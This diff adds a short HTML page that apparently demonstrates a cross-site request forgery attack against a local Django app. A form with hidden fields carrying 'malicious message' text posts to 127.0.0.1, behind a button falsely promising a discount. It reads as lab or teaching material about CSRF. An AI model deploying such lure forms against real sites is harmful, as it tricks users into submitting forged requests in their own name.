@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+	<form  method="post" class="elegant-aero" action="http://127.0.0.1:8000/home/commit/">
+{#        {% csrf_token %}#}
+			<input id="name" type="hidden" name="topic"  value="这是一条恶意信息！"/>
+			<input id="message" type="hidden" name="message" value="恶意信息内容！！！"/>
+			<input type="submit" class="button" value="点击领取优惠"/>
+	</form>
+</body>
+</html>
